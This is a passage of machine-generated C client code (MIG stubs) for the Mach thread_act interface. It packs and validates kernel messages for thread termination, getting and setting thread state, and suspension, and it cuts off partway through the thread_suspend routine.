#endif /* __cplusplus */
extern void mach_msg_destroy(mach_msg_header_t *);
#ifdef __cplusplus
}
#endif /* __cplusplus */

#ifndef	mig_internal
#define	mig_internal	static __inline__
#endif	/* mig_internal */

#ifndef	mig_external
#define mig_external
#endif	/* mig_external */

#if	!defined(__MigTypeCheck) && defined(TypeCheck)
#define	__MigTypeCheck		TypeCheck	/* Legacy setting */
#endif	/* !defined(__MigTypeCheck) */

#if	!defined(__MigKernelSpecificCode) && defined(_MIG_KERNEL_SPECIFIC_CODE_)
#define	__MigKernelSpecificCode	_MIG_KERNEL_SPECIFIC_CODE_	/* Legacy setting */
#endif	/* !defined(__MigKernelSpecificCode) */

#ifndef	LimitCheck
#define	LimitCheck 0
#endif	/* LimitCheck */

#ifndef	min
#define	min(a,b)  ( ((a) < (b))? (a): (b) )
#endif	/* min */

#if !defined(_WALIGN_)
#define _WALIGN_(x) (((x) + 3) & ~3)
#endif /* !defined(_WALIGN_) */

#if !defined(_WALIGNSZ_)
#define _WALIGNSZ_(x) _WALIGN_(sizeof(x))
#endif /* !defined(_WALIGNSZ_) */

#ifndef	UseStaticTemplates
#define	UseStaticTemplates	0
#endif	/* UseStaticTemplates */

#ifndef MIG_SERVER_ROUTINE
#define MIG_SERVER_ROUTINE
#endif

#ifndef	__MachMsgErrorWithTimeout
#define	__MachMsgErrorWithTimeout(_R_) { \
	switch (_R_) { \
	case MACH_SEND_INVALID_DATA: \
	case MACH_SEND_INVALID_DEST: \
	case MACH_SEND_INVALID_HEADER: \
		mig_put_reply_port(InP->Head.msgh_reply_port); \
		break; \
	case MACH_SEND_TIMED_OUT: \
	case MACH_RCV_TIMED_OUT: \
	default: \
		mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
	} \
}
#endif	/* __MachMsgErrorWithTimeout */

#ifndef	__MachMsgErrorWithoutTimeout
#define	__MachMsgErrorWithoutTimeout(_R_) { \
	switch (_R_) { \
	case MACH_SEND_INVALID_DATA: \
	case MACH_SEND_INVALID_DEST: \
	case MACH_SEND_INVALID_HEADER: \
		mig_put_reply_port(InP->Head.msgh_reply_port); \
		break; \
	default: \
		mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
	} \
}
#endif	/* __MachMsgErrorWithoutTimeout */

#ifndef	__DeclareSendRpc
#define	__DeclareSendRpc(_NUM_, _NAME_)
#endif	/* __DeclareSendRpc */

#ifndef	__BeforeSendRpc
#define	__BeforeSendRpc(_NUM_, _NAME_)
#endif	/* __BeforeSendRpc */

#ifndef	__AfterSendRpc
#define	__AfterSendRpc(_NUM_, _NAME_)
#endif	/* __AfterSendRpc */

#ifndef	__DeclareSendSimple
#define	__DeclareSendSimple(_NUM_, _NAME_)
#endif	/* __DeclareSendSimple */

#ifndef	__BeforeSendSimple
#define	__BeforeSendSimple(_NUM_, _NAME_)
#endif	/* __BeforeSendSimple */

#ifndef	__AfterSendSimple
#define	__AfterSendSimple(_NUM_, _NAME_)
#endif	/* __AfterSendSimple */

#define msgh_request_port	msgh_remote_port
#define msgh_reply_port		msgh_local_port



#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_terminate_t__defined)
#define __MIG_check__Reply__thread_terminate_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_terminate_t(__Reply__thread_terminate_t *Out0P)
{

	typedef __Reply__thread_terminate_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3700) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_terminate_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_terminate */
mig_external kern_return_t thread_terminate
(
	thread_act_t target_act
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_terminate_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_terminate_t__defined */

	__DeclareSendRpc(3600, "thread_terminate")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(17, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3600;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3600, "thread_terminate")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3600, "thread_terminate")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_terminate_t__defined)
	check_result = __MIG_check__Reply__thread_terminate_t((__Reply__thread_terminate_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_terminate_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__act_get_state_t__defined)
#define __MIG_check__Reply__act_get_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__act_get_state_t(__Reply__act_get_state_t *Out0P)
{

	typedef __Reply__act_get_state_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 3701) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 5184)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->old_stateCnt > 1296 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 5184)) / 4< Out0P->old_stateCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 5184) + Out0P->old_stateCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__act_get_state_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine act_get_state */
mig_external kern_return_t act_get_state
(
	thread_read_t target_act,
	int flavor,
	thread_state_t old_state,
	mach_msg_type_number_t *old_stateCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int flavor;
		mach_msg_type_number_t old_stateCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__act_get_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__act_get_state_t__defined */

	__DeclareSendRpc(3601, "act_get_state")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*old_stateCnt < 1296)
		InP->old_stateCnt = *old_stateCnt;
	else
		InP->old_stateCnt = 1296;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3601;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3601, "act_get_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3601, "act_get_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__act_get_state_t__defined)
	check_result = __MIG_check__Reply__act_get_state_t((__Reply__act_get_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__act_get_state_t__defined) */

	if (Out0P->old_stateCnt > *old_stateCnt) {
		(void)memcpy((char *) old_state, (const char *) Out0P->old_state, 4 *  *old_stateCnt);
		*old_stateCnt = Out0P->old_stateCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_state, (const char *) Out0P->old_state, 4 * Out0P->old_stateCnt);

	*old_stateCnt = Out0P->old_stateCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__act_set_state_t__defined)
#define __MIG_check__Reply__act_set_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__act_set_state_t(__Reply__act_set_state_t *Out0P)
{

	typedef __Reply__act_set_state_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3702) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__act_set_state_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine act_set_state */
mig_external kern_return_t act_set_state
(
	thread_act_t target_act,
	int flavor,
	thread_state_t new_state,
	mach_msg_type_number_t new_stateCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int flavor;
		mach_msg_type_number_t new_stateCnt;
		natural_t new_state[1296];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__act_set_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__act_set_state_t__defined */

	__DeclareSendRpc(3602, "act_set_state")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (new_stateCnt > 1296) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->new_state, (const char *) new_state, 4 * new_stateCnt);

	InP->new_stateCnt = new_stateCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 5184) + ((4 * new_stateCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3602;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3602, "act_set_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3602, "act_set_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__act_set_state_t__defined)
	check_result = __MIG_check__Reply__act_set_state_t((__Reply__act_set_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__act_set_state_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_get_state_t__defined)
#define __MIG_check__Reply__thread_get_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_get_state_t(__Reply__thread_get_state_t *Out0P)
{

	typedef __Reply__thread_get_state_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 3703) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 5184)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->old_stateCnt > 1296 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 5184)) / 4< Out0P->old_stateCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 5184) + Out0P->old_stateCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_get_state_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_get_state */
mig_external kern_return_t thread_get_state
(
	thread_read_t target_act,
	thread_state_flavor_t flavor,
	thread_state_t old_state,
	mach_msg_type_number_t *old_stateCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t old_stateCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_get_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_get_state_t__defined */

	__DeclareSendRpc(3603, "thread_get_state")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*old_stateCnt < 1296)
		InP->old_stateCnt = *old_stateCnt;
	else
		InP->old_stateCnt = 1296;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3603;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3603, "thread_get_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3603, "thread_get_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_get_state_t__defined)
	check_result = __MIG_check__Reply__thread_get_state_t((__Reply__thread_get_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_get_state_t__defined) */

	if (Out0P->old_stateCnt > *old_stateCnt) {
		(void)memcpy((char *) old_state, (const char *) Out0P->old_state, 4 *  *old_stateCnt);
		*old_stateCnt = Out0P->old_stateCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_state, (const char *) Out0P->old_state, 4 * Out0P->old_stateCnt);

	*old_stateCnt = Out0P->old_stateCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_set_state_t__defined)
#define __MIG_check__Reply__thread_set_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_set_state_t(__Reply__thread_set_state_t *Out0P)
{

	typedef __Reply__thread_set_state_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3704) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_set_state_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_set_state */
mig_external kern_return_t thread_set_state
(
	thread_act_t target_act,
	thread_state_flavor_t flavor,
	thread_state_t new_state,
	mach_msg_type_number_t new_stateCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t new_stateCnt;
		natural_t new_state[1296];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__thread_set_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_set_state_t__defined */

	__DeclareSendRpc(3604, "thread_set_state")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (new_stateCnt > 1296) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->new_state, (const char *) new_state, 4 * new_stateCnt);

	InP->new_stateCnt = new_stateCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 5184) + ((4 * new_stateCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3604;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3604, "thread_set_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3604, "thread_set_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_set_state_t__defined)
	check_result = __MIG_check__Reply__thread_set_state_t((__Reply__thread_set_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_set_state_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_suspend_t__defined)
#define __MIG_check__Reply__thread_suspend_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_suspend_t(__Reply__thread_suspend_t *Out0P)
{

	typedef __Reply__thread_suspend_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3705) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_suspend_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_suspend */
mig_external kern_return_t thread_suspend
(
	thread_read_t target_act
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
